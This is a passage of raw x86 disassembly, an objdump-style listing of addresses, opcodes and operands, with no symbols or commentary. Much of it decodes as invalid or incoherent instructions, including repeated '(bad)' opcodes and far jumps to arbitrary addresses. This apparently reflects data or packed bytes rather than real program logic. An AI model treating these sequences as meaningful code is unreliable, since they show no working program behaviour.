  407755:	mov    ds:0xb8dd81f7,al
  40775a:	xor    al,0x1c
  40775c:	outs   dx,BYTE PTR ds:[esi]
  40775d:	mov    ds:0x2757256d,al
  407762:	enter  0x9358,0x7
  407766:	mov    dl,BYTE PTR [edx+0x24c6c612]
  40776c:	add    edx,esp
  40776e:	jno    0x4076f5
  407770:	sub    eax,0x2a4b0ec
  407775:	and    eax,0xd23ed34c
  40777a:	(bad)  
  40777b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40777c:	data16 loope 0x4077d2
  40777f:	retf   0x5671
  407782:	ins    BYTE PTR es:[edi],dx
  407783:	pop    ds
  407784:	popa   
  407785:	outs   dx,BYTE PTR ds:[esi]
  407786:	dec    edx
  407787:	pop    es
  407788:	outs   dx,DWORD PTR ds:[esi]
  407789:	mul    BYTE PTR [ebx-0x6e]
  40778c:	loopne 0x407758
  40778e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40778f:	inc    esp
  407790:	mov    ds:0xb310df18,eax
  407795:	das    
  407796:	pop    esi
  407797:	jne    0x4077e0
  407799:	or     ch,BYTE PTR ds:0x903f0b4d
  40779f:	mov    ebx,0xa6ce1fa5
  4077a4:	sub    BYTE PTR [eax-0x42],ah
  4077a7:	and    dl,BYTE PTR [eax-0x1a057381]
  4077ad:	mov    dh,0x5f
  4077af:	dec    edi
  4077b0:	test   DWORD PTR ds:0x414e41ea,edi
  4077b6:	cmp    al,0xa0
  4077b8:	sbb    cl,al
  4077ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077bb:	sub    al,0x21
  4077bd:	fs jo  0x407838
  4077c0:	push   0x61
  4077c2:	sbb    eax,0xa4b6d049
  4077c7:	outs   dx,BYTE PTR ds:[esi]
  4077c8:	cmp    eax,0xd1f32483
  4077cd:	sub    eax,DWORD PTR [edi-0x16]
  4077d0:	arpl   WORD PTR [edx],si
  4077d2:	push   edx
  4077d3:	and    dh,bl
  4077d5:	or     eax,0xddaa7c69
  4077da:	and    al,0x5b
  4077dc:	adc    dl,BYTE PTR [esi+0x7c]
  4077df:	or     ebx,DWORD PTR [ecx+0x500449e8]
  4077e5:	aam    0xdc
  4077e7:	hlt    
  4077e8:	arpl   WORD PTR [edi],bx
  4077ea:	xchg   edx,eax
  4077eb:	imul   edx,DWORD PTR [ebx+0x27],0x20
  4077ef:	bound  esi,QWORD PTR [ebx]
  4077f1:	scas   al,BYTE PTR es:[edi]
  4077f2:	in     al,0xff
  4077f4:	or     edx,esp
  4077f6:	mov    DWORD PTR [esi],esi
  4077f8:	mov    cl,0x90
  4077fa:	aam    0x54
  4077fc:	test   al,0x9c
  4077fe:	dec    ebx
  4077ff:	rol    BYTE PTR [ecx+0x4a313b70],cl
  407805:	add    eax,0xe5b4d0de
  40780a:	idiv   BYTE PTR [ebp+0x23]
  40780d:	into   
  40780e:	fbld   TBYTE PTR [ecx+0x3c487ef3]
  407814:	cmp    eax,0x16a99c08
  407819:	shl    eax,cl
  40781b:	js     0x407812
  40781d:	pusha  
  40781e:	(bad)  
  40781f:	int    0x95
  407821:	mov    DWORD PTR [edi-0x74],ebx
  407824:	fsubr  DWORD PTR [edx+0x6b8b2d69]
  40782a:	xchg   edi,eax
  40782b:	popf   
  40782c:	dec    eax
  40782d:	pop    esp
  40782e:	xchg   esi,eax
  40782f:	test   BYTE PTR [esi-0x65],0x5a
  407833:	idiv   BYTE PTR [ebx-0x6f9d0f68]
  407839:	and    BYTE PTR ds:0x75b98abd,al
  407840:	mov    ds:0x5b7b59df,al
  407845:	xor    BYTE PTR [ecx],0x70
  407848:	add    edi,edx
  40784a:	mov    ch,0xe3
  40784c:	sub    DWORD PTR [ebx+0x1a],edi
  40784f:	jg     0x4077f2
  407851:	mov    eax,ds:0xdf3256ca
  407856:	mov    esp,0xea75a833
  40785b:	push   eax
  40785c:	jbe    0x4078ba
  40785e:	pusha  
  40785f:	in     eax,0xeb
  407861:	jnp    0x4078ae
  407863:	imul   ebp,DWORD PTR [edx-0x4d],0x40
  407867:	add    ebx,DWORD PTR [edx+0x71]
  40786a:	ficomp DWORD PTR [ecx]
  40786c:	sub    al,0xd0
  40786e:	push   ecx
  40786f:	mov    cl,0xca
  407871:	mov    bl,0xa4
  407873:	jns    0x407821
  407875:	sbb    esi,edx
  407877:	cmc    
  407878:	loope  0x40788f
  40787a:	psubw  mm3,QWORD PTR [ebp+ebp*8-0x19]
  40787f:	stc    
  407880:	mov    al,ds:0x41a9cee5
  407885:	(bad)  
  407886:	and    eax,0x3c9dd1d0
  40788b:	loop   0x40782d
  40788d:	das    
  40788e:	sbb    BYTE PTR [edi],ah
  407890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407891:	adc    ecx,eax
  407893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407894:	add    al,0xbd
  407896:	std    
  407897:	mov    BYTE PTR [edi-0x6ae7134b],dl
  40789d:	pop    esi
  40789e:	clc    
  40789f:	cmp    ebp,esp
  4078a1:	fld    DWORD PTR [eax]
  4078a3:	pop    esi
  4078a4:	pop    ds
  4078a5:	jno    0x407860
  4078a7:	repz push ecx
  4078a9:	pop    esp
  4078aa:	pushf  
  4078ab:	repz lea esp,[ebx]
  4078ae:	(bad)  
  4078af:	ins    DWORD PTR es:[edi],dx
  4078b0:	mov    ch,0x35
  4078b2:	sub    BYTE PTR [esi],cl
  4078b4:	mov    BYTE PTR [eax+0x4d2e3eda],ah
  4078ba:	test   DWORD PTR ds:0xa75c3b7,edx
  4078c0:	mov    bh,0x6
  4078c2:	cmp    ebp,DWORD PTR [eax+0x106ba946]
  4078c8:	out    dx,al
  4078c9:	adc    al,0xd2
  4078cb:	dec    edx
  4078cc:	add    ecx,esp
  4078ce:	jp     0x40787f
  4078d0:	(bad)  
  4078d1:	(bad)  [edx+0x10]
  4078d4:	into   
  4078d5:	dec    ebp
  4078d6:	fisubr WORD PTR [edi+0x7e]
  4078d9:	xchg   ebp,eax
  4078da:	mov    WORD PTR [esi+0x15],cs
  4078dd:	push   cs
  4078de:	in     al,0x12
  4078e0:	loopne 0x407925
  4078e2:	sbb    bh,BYTE PTR [edx+edi*2]
  4078e5:	lea    edx,[edx+0x18cb3b45]
  4078eb:	(bad)  
  4078ec:	push   edi
  4078ed:	jge    0x4078bd
  4078ef:	jg     0x4078ea
  4078f1:	xchg   ebx,eax
  4078f2:	cmp    ebp,DWORD PTR [ebp-0x4f]
  4078f5:	inc    ebp
  4078f6:	mov    ecx,0x304158ef
  4078fb:	or     DWORD PTR [eax+0x2f],0x0
  4078ff:	out    0xe1,al
  407901:	popf   
  407902:	adc    BYTE PTR gs:[edi-0x65b60c52],dh
  407909:	popa   
  40790a:	out    0xfe,eax
  40790c:	and    al,al
  40790e:	pop    eax
  40790f:	mov    eax,0x7d51762c
  407914:	test   eax,0x2a2f6db7
  407919:	sar    BYTE PTR [edi],cl
  40791b:	xchg   ebp,eax
  40791c:	fwait
  40791d:	xlat   BYTE PTR ds:[ebx]
  40791e:	pop    esi
  40791f:	xor    bl,BYTE PTR [eax-0x5648ddba]
  407925:	mov    edx,0x2a866def
  40792a:	mov    ebp,0x33226e88
  40792f:	jl     0x40794e
  407931:	leave  
  407932:	push   0xffffffe2
  407934:	cli    
  407935:	mov    cs,WORD PTR [eax+edx*2+0x14]
  407939:	lds    edx,FWORD PTR [esi+0x5028b829]
  40793f:	and    al,0xe9
  407941:	cmp    BYTE PTR [esi-0x4],al
  407944:	clc    
  407945:	icebp  
  407946:	pop    ss
  407947:	enter  0x8ce5,0x4b
  40794b:	jmp    0xf760c080
  407950:	cmp    ebx,DWORD PTR [edx+0x54]
  407953:	pop    ss
  407954:	dec    eax
  407955:	int    0x41
  407957:	stos   DWORD PTR es:[edi],eax
  407958:	(bad)  
  407959:	fs pushf 
  40795b:	xor    BYTE PTR [ebx+edi*2+0xa],ch
  40795f:	xor    DWORD PTR [edi],ebp
  407961:	imul   ebx,DWORD PTR [ecx-0x2070eb2e],0x8e5462f3
  40796b:	stos   BYTE PTR es:[edi],al
  40796c:	add    dh,BYTE PTR [eax+0x1033f3b6]
  407972:	outs   dx,BYTE PTR ds:[esi]
  407973:	fs hlt 
  407975:	fwait
  407976:	cmp    BYTE PTR [ebx-0xd],bl
  407979:	xor    edx,DWORD PTR [eax+0x42db5008]
  40797f:	dec    ebx
  407980:	push   0xdd8ad7ab
  407985:	jmp    0xdb4e:0x5bfe4e3c
  40798c:	test   BYTE PTR [edx+ecx*2+0x14],bh
  407990:	add    bh,BYTE PTR [edx-0x204df55d]
  407996:	mov    cl,0x4f
  407998:	mov    dl,0x63
  40799a:	dec    edi
  40799b:	cwde   
  40799c:	sar    DWORD PTR ds:0x2c435437,1
  4079a2:	mul    DWORD PTR [esi-0x15]
  4079a5:	jo     0x4079ed
  4079a7:	sub    dl,BYTE PTR [esi-0x27]
  4079aa:	(bad)  
  4079ab:	cmp    eax,0x96d52c3d
  4079b0:	ins    DWORD PTR es:[edi],dx
  4079b1:	and    DWORD PTR [edi-0x68],ebx
  4079b4:	ins    BYTE PTR es:[edi],dx
  4079b5:	lods   al,BYTE PTR cs:[esi]
  4079b7:	ja     0x4079b1
  4079b9:	xchg   esp,eax
  4079ba:	enter  0xfd84,0xb7
  4079be:	push   ss
  4079bf:	mov    bh,BYTE PTR [eax]
  4079c1:	stos   BYTE PTR es:[edi],al
  4079c2:	dec    ebp
  4079c3:	cmp    ah,bh
  4079c5:	(bad)  
  4079c6:	cs js  0x40796f
  4079c9:	xor    bh,bl
  4079cb:	scas   eax,DWORD PTR es:[edi]
  4079cc:	sub    DWORD PTR [edi+0x45],ebx
  4079cf:	test   eax,0x9a3d49a4
  4079d4:	retf   
  4079d5:	mov    ebx,0xa1175963
  4079da:	je     0x407a0d
  4079dc:	mov    esp,0x50dccb1c
  4079e1:	pop    ebp
  4079e2:	push   0xffffffe6
  4079e4:	in     eax,0x57
  4079e6:	scas   al,BYTE PTR es:[edi]
  4079e7:	or     DWORD PTR [edx],0x36
  4079ea:	shl    BYTE PTR [eax+0x66],1
  4079ed:	imul   ebp,DWORD PTR ss:[edx+esi*2],0xffffffae
  4079f2:	mul    al
  4079f4:	pop    edx
  4079f5:	cmp    al,BYTE PTR [ecx+0x188ebbbf]
  4079fb:	out    0x81,al
  4079fd:	xor    ch,BYTE PTR [ebp+0x240ce7b6]
  407a03:	and    ah,dl
  407a05:	or     eax,0xf76afaa8
  407a0a:	inc    ebx
  407a0b:	stc    
  407a0c:	bound  ebx,QWORD PTR [edi]
  407a0e:	push   esi
  407a0f:	adc    ch,BYTE PTR [edi]
  407a11:	shr    edi,0xcb
  407a14:	sub    BYTE PTR [esi],al
  407a16:	ret    0xe833
  407a19:	or     eax,0x2d832284
  407a1e:	pop    ecx
  407a1f:	retf   
  407a20:	xchg   ebp,eax
  407a21:	bound  ecx,QWORD PTR [eax-0x5bbddc06]
  407a27:	imul   eax,ecx,0x25
  407a2a:	xchg   ecx,eax
  407a2b:	cmc    
  407a2c:	sub    DWORD PTR [edx-0x64492e4c],0x2d
  407a33:	loopne 0x407a40
  407a35:	loop   0x407a1d
  407a37:	add    ch,BYTE PTR [edx-0x56]
  407a3a:	aaa    
  407a3b:	and    bl,BYTE PTR [ebp-0x71af0534]
  407a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a42:	mov    dl,0x21
  407a44:	aas    
  407a45:	bound  edi,QWORD PTR [edx+0x62]
  407a48:	scas   eax,DWORD PTR es:[edi]
  407a49:	xchg   BYTE PTR [ebx-0x68],cl
  407a4c:	aad    0x22
  407a4e:	xor    edi,DWORD PTR [ebp+0x78]
  407a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a52:	mov    edi,0x7e329c38
  407a57:	push   cs
  407a58:	cmc    
  407a59:	clc    
  407a5a:	xchg   edx,eax
  407a5b:	sbb    cl,BYTE PTR [ebp-0x49]
  407a5e:	outs   dx,BYTE PTR ds:[esi]
  407a5f:	ror    BYTE PTR [ecx-0x3f],cl
  407a62:	push   eax
  407a63:	cdq    
  407a64:	cmp    BYTE PTR [ebx-0x2b603daf],cl
  407a6a:	inc    edi
  407a6b:	jae    0x407a35
  407a6d:	jge    0x4079f8
  407a6f:	aad    0xcd
  407a71:	loope  0x407a5b
  407a73:	adc    DWORD PTR [ebx-0x2467310],edx
  407a79:	pop    ebx
  407a7a:	mov    esp,edx
  407a7c:	adc    al,0xac
  407a7e:	popf   
  407a7f:	jmp    0x407abc
  407a81:	mov    al,ds:0x50700971
  407a86:	mov    ds:0x37e2490a,al
  407a8b:	mov    cl,0x98
  407a8d:	(bad)  
  407a8e:	out    dx,al
  407a8f:	rcl    BYTE PTR [ebx],cl
  407a91:	xchg   eax,edi
  407a93:	add    eax,0x7cdda94b
  407a98:	or     DWORD PTR [eax-0x6a],eax
  407a9b:	mov    WORD PTR [ecx-0x31ee4bd6],?
  407aa1:	add    BYTE PTR [ebp-0x5],bh
  407aa4:	retf   0x14ec
  407aa7:	jne    0x407ada
  407aa9:	addr16 jmp 0xaebf227b
  407aaf:	ds jae 0x407adb
  407ab2:	add    BYTE PTR [ecx],dh
  407ab4:	mov    esp,0xd665ab80
  407ab9:	jno    0x407b36
  407abb:	inc    edi
  407abc:	fs mov ch,0xa5
  407abf:	lock mov al,ds:0xd23f761c
  407ac5:	cdq    
  407ac6:	call   0x9f7:0x74952659
  407acd:	(bad)
  407ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ad1:	call   0xcb9e:0xb9c36d01
  407ad8:	xchg   esp,eax
  407ad9:	loopne 0x407ac0
  407adb:	push   esi
  407adc:	cld    
  407add:	jo     0x407acd
  407adf:	out    dx,al
  407ae0:	sub    al,0x98
  407ae2:	in     al,dx
  407ae3:	ins    BYTE PTR es:[edi],dx
  407ae4:	test   eax,0xb489dfe1
  407ae9:	jmp    0xa71e27cd
  407aee:	cs inc ebx
  407af0:	stos   BYTE PTR es:[edi],al
  407af1:	adc    DWORD PTR [edi],esi
  407af3:	int    0x7f
  407af5:	sbb    eax,0x2e7cc657
  407afa:	sbb    ebp,DWORD PTR [eax]
  407afc:	jp     0x407aba
  407afe:	fdiv   st(2),st
  407b00:	fmul   QWORD PTR [ebp+0x55]
  407b03:	xchg   esi,eax
  407b04:	xchg   DWORD PTR [esi-0x599636e9],ebx
  407b0a:	test   WORD PTR [ebx+eax*2+0x516b1453],0xab44
  407b14:	in     al,dx
  407b15:	lahf   
  407b16:	mov    WORD PTR [ebp+0x25eb6055],es
  407b1c:	or     al,0xa
  407b1e:	fcom   DWORD PTR [esi-0x48807c87]
  407b24:	ret    
  407b25:	std    
  407b26:	je     0x407b97
  407b28:	add    ebx,DWORD PTR [ecx-0x5e]
  407b2b:	aaa    
  407b2c:	(bad)  
  407b2d:	neg    DWORD PTR [esi]
  407b2f:	fistp  QWORD PTR [eax]
  407b31:	dec    esi
  407b32:	(bad)  
  407b33:	adc    eax,0xf07e22
  407b38:	dec    edi
  407b39:	out    0x96,eax
  407b3b:	out    dx,al
  407b3c:	sub    BYTE PTR [edi-0x4a],0xda
  407b40:	xrelease mov DWORD PTR [edx-0x80],edi
  407b44:	and    BYTE PTR [ecx+esi*8-0x37],bh
  407b48:	scas   al,BYTE PTR es:[edi]
  407b49:	mov    ebp,0xdb6f9066
  407b4e:	retf   0x4c96
  407b51:	add    al,0x7
  407b53:	and    cl,cl
  407b55:	pushf  
  407b56:	xchg   esp,eax
  407b57:	jns    0x407b23
  407b59:	sbb    al,BYTE PTR [edi+edx*1]
  407b5c:	je     0x407b96
  407b5e:	lods   eax,DWORD PTR ds:[esi]
  407b5f:	clc    
  407b60:	jmp    0x2614:0x75beae3b
  407b67:	xchg   esp,eax
  407b68:	mov    ebp,0x5408a12
  407b6d:	aam    0x83
  407b6f:	aad    0x8d
  407b71:	xchg   edi,eax
  407b72:	jmp    0x407af9
  407b74:	cmp    ecx,edx
  407b76:	jmp    0x407bb9
  407b78:	xchg   ebp,eax
  407b79:	or     ch,ah
  407b7b:	loope  0x407b44
  407b7d:	cmp    eax,0xd1c0edc4
  407b82:	mov    al,BYTE PTR [ebx+0x29]
  407b85:	xchg   BYTE PTR ds:0xd01499,bl
  407b8b:	cmp    ebx,DWORD PTR [ecx+0x34d79883]
  407b91:	aad    0xf
  407b93:	sub    esp,DWORD PTR [edi]
  407b95:	shr    edi,0xff
  407b98:	shl    DWORD PTR [esi-0x4a],0xb2
  407b9c:	icebp  
  407b9d:	adc    bh,BYTE PTR [ebx-0x18]
  407ba0:	xor    ch,BYTE PTR [edi]
  407ba2:	or     dl,BYTE PTR [edx+0x53]
  407ba5:	addr16 ret 
  407ba7:	mov    ebp,0x44bf3638
  407bac:	or     cl,bh
  407bae:	push   0x9a104184
  407bb3:	loopne 0x407c32
  407bb5:	and    BYTE PTR ds:[ebp-0x2fa1176e],ch
  407bbc:	lea    ebx,[edx]
  407bbe:	cmp    al,0x54
  407bc0:	dec    cl
  407bc2:	xlat   BYTE PTR ds:[ebx]
  407bc3:	cli    
  407bc4:	ss mov cl,0xd1
  407bc7:	or     BYTE PTR [eax],ch
  407bc9:	and    al,0xc3
  407bcb:	jecxz  0x407bbf
  407bcd:	cdq    
  407bce:	mov    edi,DWORD PTR [edx+0x6fcebccf]
  407bd4:	fisub  DWORD PTR [ebx+0x50]
  407bd7:	dec    ebx
  407bd8:	out    0x9b,eax
  407bda:	loopne 0x407c03
  407bdc:	stc    
  407bdd:	mov    ecx,DWORD PTR [esi]
  407bdf:	hlt    
  407be0:	pop    edi
  407be1:	and    ah,dl
  407be3:	nop
  407be4:	mov    al,0x48
  407be6:	addr16 xor ebx,ebx
  407be9:	xchg   ebx,eax
  407bea:	add    bl,ch
  407bec:	iret   
  407bed:	retf   
  407bee:	ds pop ds
  407bf0:	shr    al,1
  407bf2:	mov    ecx,0xdb27cfe3
  407bf7:	into   
  407bf8:	adc    ebx,DWORD PTR [esi+esi*4]
  407bfb:	xchg   ebx,eax
  407bfc:	cmp    ebp,DWORD PTR [edi-0x21]
  407bff:	ds clc 
  407c01:	jg     0x407bbd
  407c03:	lds    esp,FWORD PTR [ebx+0x42490fda]
  407c09:	inc    ebx
  407c0a:	retf   
  407c0b:	xchg   ebp,eax
  407c0c:	adc    edi,ebp
  407c0e:	mov    ch,0x6
  407c10:	mov    DWORD PTR ds:0x7725adc,ebx
  407c16:	mov    cl,0xa6
  407c18:	inc    ecx
  407c19:	dec    edi
  407c1a:	mov    ds:0x8a97c7e5,al
  407c1f:	mov    ebp,0xb99919e0
  407c24:	sub    dh,BYTE PTR [edi+esi*2-0x32]
  407c28:	xor    dl,ch
  407c2a:	pop    esp
  407c2b:	push   esi
  407c2c:	ins    DWORD PTR es:[edi],dx
  407c2d:	ds adc ah,0x1b
  407c31:	cli    
  407c32:	push   eax
  407c33:	and    BYTE PTR [esi],dl
  407c35:	xor    DWORD PTR [ebx],ebp
  407c37:	sub    BYTE PTR [edi+0xbebafc2],cl
  407c3d:	jmp    0x1a4716f1
  407c42:	and    BYTE PTR [edi+0x6d3d1934],al
  407c48:	test   DWORD PTR [edx-0x16],0xe7437e13
  407c4f:	aad    0xbc
  407c51:	ret    
  407c52:	xchg   ecx,eax
  407c53:	hlt    
  407c54:	mov    al,0xa2
  407c56:	clc    
  407c57:	outs   dx,BYTE PTR ds:[esi]
  407c58:	jmp    0x8a9a:0xc6dd7ec9
  407c5f:	scas   eax,DWORD PTR es:[edi]
  407c60:	hlt    
  407c61:	fisttp DWORD PTR [ecx+eiz*4+0x4b]
  407c65:	(bad)  
  407c66:	ins    BYTE PTR es:[edi],dx
  407c67:	mul    BYTE PTR [edx+0x11]
  407c6a:	inc    edx
  407c6b:	xor    ch,BYTE PTR [ecx]
  407c6d:	jne    0x407c44
  407c6f:	ret    0xfd5c
  407c72:	in     al,0xfd
  407c74:	push   ebp
  407c75:	jnp    0x407cda
  407c77:	aam    0x33
  407c79:	and    eax,0x248b8d86
  407c7e:	(bad)  
  407c7f:	aas    
  407c80:	dec    esp
  407c81:	and    ebx,DWORD PTR [esi+0x6c]
  407c84:	stos   DWORD PTR es:[edi],eax
  407c85:	ss test al,0xe
  407c88:	lods   al,BYTE PTR ds:[esi]
  407c89:	xor    BYTE PTR [edi+0x56],bh
  407c8c:	mov    esp,0x9c056ff3
  407c91:	xchg   edi,eax
  407c92:	mov    bh,0xcc
  407c94:	sub    DWORD PTR [ebp+0x288eaca1],edx
  407c9a:	mov    WORD PTR [eax+0x41],?
  407c9d:	test   DWORD PTR [eax+0x55],0x8cf2e36f
  407ca4:	xchg   ebx,eax
  407ca5:	ja     0x407caf
  407ca7:	xor    edx,DWORD PTR [ecx]
  407ca9:	adc    ch,bl
  407cab:	mov    edi,esp
  407cad:	push   es
  407cae:	(bad)  
  407caf:	rcr    BYTE PTR [edx-0x38b6d477],1
  407cb5:	dec    esi
  407cb6:	loop   0x407ce0
  407cb8:	dec    ecx
  407cb9:	cmp    bh,BYTE PTR [ebx+0x20e80d70]
  407cbf:	fadd   QWORD PTR [eax+0x64]
  407cc2:	inc    edi
  407cc3:	push   0x6e
  407cc5:	push   esi
  407cc6:	xchg   esi,eax
  407cc7:	jno    0x407c67
  407cc9:	in     al,0xe2
  407ccb:	jg     0x407c79
  407ccd:	lods   al,BYTE PTR ds:[esi]
  407cce:	(bad)  
  407ccf:	icebp  
  407cd0:	push   0xffffffcb
  407cd2:	push   esp
  407cd3:	sub    edx,DWORD PTR [ecx+0x16a06187]
  407cd9:	sub    esp,edi
  407cdb:	mov    ds,esi
  407cdd:	stos   BYTE PTR es:[edi],al
  407cde:	and    al,0x62
  407ce0:	in     eax,dx
  407ce1:	pop    esp
  407ce2:	retf   0x4039
  407ce5:	sub    ah,BYTE PTR [ecx]
  407ce7:	stos   DWORD PTR es:[edi],eax
  407ce8:	or     eax,0xe4dd4b75
  407ced:	adc    ah,BYTE PTR [edi]
  407cef:	or     BYTE PTR [edi-0x80],bh
  407cf2:	push   ebx
  407cf3:	mov    bl,0xbd
  407cf5:	sub    eax,0x33fcc47b
  407cfa:	xor    al,ah
  407cfc:	mov    eax,ds:0xd99cda36
  407d01:	dec    esp
  407d02:	jle    0x407d49
  407d04:	xchg   edx,eax
  407d05:	pop    es
  407d06:	jns    0x407d30
  407d08:	inc    esi
  407d09:	or     bl,BYTE PTR [ecx]
  407d0b:	popa   
  407d0c:	int3   
  407d0d:	pop    esi
  407d0e:	inc    edi
  407d0f:	js     0x407c94
  407d11:	xor    eax,0x456c6087
  407d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d17:	inc    edi
  407d18:	popf   
  407d19:	test   ah,cl
  407d1b:	das    
  407d1c:	mov    ah,0xb1
  407d1e:	mov    edx,DWORD PTR [edx+0x49c30184]
  407d24:	mov    edx,0x52ab93ce
  407d29:	outs   dx,BYTE PTR ds:[esi]
  407d2a:	pop    edi
  407d2b:	ret    0xd32c
  407d2e:	dec    ecx
  407d2f:	mov    dl,0x14
  407d31:	and    eax,0x222d19f3
  407d36:	nop
  407d37:	mov    esi,edx
  407d39:	xor    al,0x4a
  407d3b:	adc    edx,DWORD PTR [eax+0x1c4f04e1]
  407d41:	(bad)  
  407d42:	std    
  407d43:	or     ebx,DWORD PTR [esi-0x46529460]
  407d49:	mov    edi,0x94a60254
  407d4e:	and    DWORD PTR [eax],esp
  407d50:	cmp    al,0xf7
  407d52:	sbb    al,BYTE PTR [ebp+0x70f7681a]
  407d58:	out    0x52,al
  407d5a:	(bad)  
  407d5b:	adc    esi,DWORD PTR [ecx+0x8ee90d0]
  407d61:	inc    esp
  407d62:	arpl   WORD PTR [edx-0x6c],si
  407d65:	inc    eax
  407d66:	adc    al,0xea
  407d68:	aas    
  407d69:	outs   dx,BYTE PTR ds:[esi]
  407d6a:	fst    DWORD PTR [eax+0x1a33bbfd]
  407d70:	outs   dx,DWORD PTR ds:[esi]
  407d71:	jp     0x407dbb
  407d73:	inc    ebx
  407d74:	(bad)  
  407d75:	jae    0x407d8f
  407d77:	mov    BYTE PTR [ecx-0x43],dl
  407d7a:	mov    al,ds:0x2376cc8c
  407d7f:	fst    DWORD PTR [ebx+0x1ff27f2]
  407d85:	and    BYTE PTR [esi],dh
  407d87:	fisubr DWORD PTR [ecx-0x2cb6d17b]
  407d8d:	jns    0x407d20
  407d8f:	dec    al
  407d91:	test   DWORD PTR [esi],esi
  407d93:	add    edx,DWORD PTR [eax+esi*2]
  407d96:	popf   
  407d97:	add    eax,0x5d394244
  407d9c:	push   eax
  407d9d:	pop    edi
  407d9e:	cmp    eax,0xa18a89d7
  407da3:	push   edx
  407da4:	pop    ecx
  407da5:	jmp    0xc0bc:0xb6ccac4f
  407dac:	and    dl,BYTE PTR [ebx-0x27d56f88]
  407db2:	dec    ecx
  407db3:	xor    BYTE PTR [ebx],dh
  407db5:	add    DWORD PTR [esi+0x62],0xffffffb8
  407db9:	aaa    
  407dba:	sub    al,0x5b
  407dbc:	and    al,BYTE PTR [ebp+0x4314ed78]
  407dc2:	sub    bl,BYTE PTR [edi*1-0x61e46601]
  407dc9:	ret    
  407dca:	loopne 0x407e23
  407dcc:	dec    ecx
  407dcd:	inc    ebp
  407dce:	pushf  
  407dcf:	add    BYTE PTR [ebp+0x4],cl
  407dd2:	and    DWORD PTR [esi],ecx
  407dd4:	sub    ah,BYTE PTR [esp+ecx*1-0x3255359d]
  407ddb:	test   DWORD PTR [eax+0x3b19df2d],ebx
  407de1:	sub    eax,0x25f1617a
  407de6:	sbb    al,0xb3
  407de8:	push   ds
  407de9:	cmc    
  407dea:	adc    DWORD PTR [edi+0x23e0416b],eax
  407df0:	and    al,0xa2
  407df2:	std    
  407df3:	inc    ax
  407df5:	jne    0x407e64
  407df7:	sub    ecx,DWORD PTR [edx+0x4e151157]
  407dfd:	sub    bh,BYTE PTR [ebx+0x5c]
  407e00:	xchg   edx,eax
  407e01:	retf   
  407e02:	jl     0x407d9d
  407e04:	cmp    al,0xb7
  407e06:	mov    ebx,es
  407e08:	adc    ebx,ebx
  407e0a:	mov    WORD PTR [ebp-0x3fa92b0f],gs
  407e10:	adc    ch,dh
  407e12:	cdq    
  407e13:	mov    eax,0xe11b1cc
  407e18:	nop
  407e19:	inc    eax
  407e1a:	int3   
  407e1b:	jb     0x407ddd
  407e1d:	sub    eax,0xeccd245
  407e22:	pop    esi
  407e23:	aas    
  407e24:	jg     0x407e8b
  407e26:	sbb    al,0x86
  407e28:	sbb    ah,BYTE PTR [edi-0x1b]
  407e2b:	and    edx,DWORD PTR [ebp-0x27]
  407e2e:	imul   edx,DWORD PTR ds:0x3255faec,0x2b8bab4
  407e38:	cmp    DWORD PTR [edi],eax
  407e3a:	xchg   ebp,eax
  407e3b:	mov    ds:0xa6112e1c,al
  407e40:	pop    esi
  407e41:	inc    edx
  407e42:	mov    ebx,0x62a2a695
  407e47:	cmp    al,0xf2
  407e49:	add    eax,ebp
  407e4b:	xor    eax,0x82c3a94b
  407e50:	ja     0x407ecb
  407e52:	mov    BYTE PTR [esi],cl
  407e54:	push   esi
  407e55:	retf   0x961f
  407e58:	adc    DWORD PTR [edx-0x4553e0eb],ebx
  407e5e:	dec    ebx
  407e5f:	fimul  DWORD PTR [edx-0x70]
  407e62:	inc    ebx
  407e63:	fldcw  WORD PTR ds:0x5c67c088
  407e69:	stos   DWORD PTR es:[edi],eax
  407e6a:	loopne 0x407e56
  407e6c:	push   esp
  407e6d:	(bad)  
  407e6e:	aaa    
  407e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e70:	test   eax,0x916996f1
  407e75:	add    dh,bh
  407e77:	add    DWORD PTR [ebx],eax
  407e79:	lea    edi,[esi]
  407e7b:	ficomp WORD PTR [esi]
  407e7d:	mov    WORD PTR [ebp-0x3c1f4532],cs
  407e83:	sahf   
  407e84:	fst    DWORD PTR [ecx+0x3c566275]
  407e8a:	sub    eax,0x6ae96bcd
  407e8f:	retf   0x67db
  407e92:	loope  0x407eab
  407e94:	xchg   DWORD PTR [ebp+0x6e3705ed],ebx
  407e9a:	test   DWORD PTR [edx],0xe68d8f70
  407ea0:	pop    eax
  407ea1:	sbb    DWORD PTR [esi],ebp
  407ea3:	pusha  
  407ea4:	xchg   DWORD PTR [esi+0x3c],eax
  407ea7:	jmp    0x407f1d
  407ea9:	cmp    al,0xc9
  407eab:	(bad)  
  407eac:	jo     0x407f23
  407eae:	sub    eax,0xb29b931e
  407eb3:	retf   
  407eb4:	outs   dx,DWORD PTR ds:[esi]
  407eb5:	addr16 mov al,ds:0x343c
  407eb9:	adc    edi,DWORD PTR [ecx]
  407ebb:	outs   dx,BYTE PTR ds:[esi]
  407ebc:	mov    ecx,0xe3db36f0
  407ec1:	mov    dl,cl
  407ec3:	push   es
  407ec4:	dec    edi
  407ec5:	dec    esi
  407ec6:	add    eax,0x2d5bb3c8
  407ecb:	call   0xea2c:0xb923dc74
  407ed2:	push   0x11
  407ed4:	cmp    BYTE PTR [edi+0x72],ch
  407ed7:	mov    BYTE PTR [esi],bl
  407ed9:	push   edx
  407eda:	mov    WORD PTR [edi+0x26],?
  407edd:	int    0x44
  407edf:	jmp    0x407e91
  407ee1:	or     dl,BYTE PTR [edi-0x3a]
  407ee4:	or     edx,DWORD PTR [ebx+0x75b4aa7a]
  407eea:	dec    ebx
  407eeb:	sar    BYTE PTR [ebx+0x55d6595e],1
  407ef1:	mov    bl,0xff
  407ef3:	sub    ebp,edx
  407ef5:	arpl   WORD PTR [ebp+0x4f],sp
  407ef8:	test   al,0x54
  407efa:	pop    eax
  407efb:	mov    ds:0x9bc50971,al
  407f00:	ja     0x407f5c
